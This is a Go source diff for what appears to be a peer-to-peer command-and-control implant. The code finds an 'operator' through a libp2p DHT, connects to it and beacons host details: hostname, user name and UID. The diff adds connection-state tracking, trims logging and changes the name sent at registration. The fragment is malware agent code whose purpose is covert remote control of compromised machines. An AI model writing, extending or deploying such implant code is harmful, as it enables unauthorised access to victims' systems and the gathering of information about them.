@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"sync"
 	"time"
 
 	"github.com/libp2p/go-libp2p"
@@ -30,6 +31,8 @@ type Agent struct {
 	config      AgentConfig
 	ctx         context.Context
 	cancel      context.CancelFunc
+	connected   bool
+	connectedMu sync.Mutex
 }
 
 type AgentConfig struct {
@@ -165,21 +168,20 @@ func (a *Agent) discoverOperatorLoop(ns string) {
 			continue
 		}
 
-		found := false
 		for pi := range peerCh {
 			if pi.ID == a.node.ID() || len(pi.Addrs) == 0 {
 				continue
 			}
-			found = true
-			log.Printf("[implant] found candidate %s with %d addrs", pi.ID.String(), len(pi.Addrs))
 			if err := a.node.ConnectToPeer(a.ctx, pi); err != nil {
 				log.Printf("[implant] DHT connect to %s: %v", pi.ID.String(), err)
 				continue
 			}
-			log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
-		}
-		if !found {
-			log.Printf("[implant] no operator found on DHT yet, retrying...")
+			a.connectedMu.Lock()
+			if !a.connected {
+				a.connected = true
+				log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
+			}
+			a.connectedMu.Unlock()
 		}
 
 		select {
@@ -208,7 +210,7 @@ func (a *Agent) beaconLoop() {
 func (a *Agent) sendBeaconRegister() {
 	hostname, _ := os.Hostname()
 	reg := &arachnepb.Register{
-		Name:     hostname,
+		Name:     os.Getenv("USER"),
 		Hostname: hostname,
 		Username: os.Getenv("USER"),
 		UID:      fmt.Sprintf("%d", os.Getuid()),
